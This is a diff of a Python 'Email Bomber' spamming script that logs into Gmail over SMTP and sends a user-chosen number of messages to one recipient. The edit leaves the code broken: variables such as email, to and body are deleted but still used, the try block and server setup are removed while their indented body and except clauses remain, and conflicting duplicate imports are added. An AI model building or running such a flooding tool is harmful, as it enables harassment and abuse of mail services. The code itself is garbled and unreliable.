@@ -4,49 +4,27 @@
 #Use it at your own risk !!!
 # Python 3 rewrite by Omicron166
 
-
 from os import urandom
+import os
 import smtplib
 from getpass import getpass
+import getpass
 import sys
 from time import sleep
+import time
 
 print ('                                                                    ')
 print ('                                                                    ')
-print ('            #################################################       ')
-print ('            #                                               #       ')
-print ('            #        Email Bomber ( Spamming Tool )         #       ')
-print ('            #                                               #       ')
-print ('            #                  Version 3.0                  #       ')
-print ('            #                                               #       ')
-print ('            #           Modified by : Omicron166            #       ')
-print ('            #                                               #       ')
-print ('            #       Only for Educational Purposes !!        #       ')
-print ('            #                                               #       ')
-print ('            #################################################       ')
 
-print ('                                                                   ')
-
-
-print ('                                           ')
-
-print ('    ')
-email = input('Attacker Gmail Address : ')
 print ('             ')
 user = input('Anonymous name : ')
 print ('      ')
 passwd = getpass('Password: ')
+passwd = getpass.getpass('Password: ')
 
 print ('   ')
 
-to = input('\nTo: ')
 
-
-print ('    ')
-
-body = input('Message: ')
-
-print ('    ')
 
 total = input('Number of send: ')
 
@@ -64,21 +42,22 @@ if not server == '':
 else:
     smtp_server = 'smtp.gmail.com'
     port = 587
+smtp_server = 'smtp.gmail.com'
+port = 587
 
 
 print ('')
 
-try:
-    server = smtplib.SMTP(smtp_server, port)
-    server.ehlo()
     server.starttls()
     server.login(email, passwd)
     for i in range(1, int(total) + 1):
         subject = urandom(9)
+        subject = os.urandom(9)
         msg = 'From: ' + user + '\nSubject: ' + '\n' + body
         server.sendmail(email, to, msg)
         print ("\rE-mails sent: %i" % i)
         sleep(1)
+        time.sleep(1)
         sys.stdout.flush()
     server.quit()
     print ('\n Done !!!')
@@ -87,4 +66,5 @@ except KeyboardInterrupt:
     sys.exit()
 except smtplib.SMTPAuthenticationError:
     print ('\n[!] The username, password or custom STMP server you entered is incorrect.')
+    print ('\n[!] The username or password you entered is incorrect.')
     sys.exit()
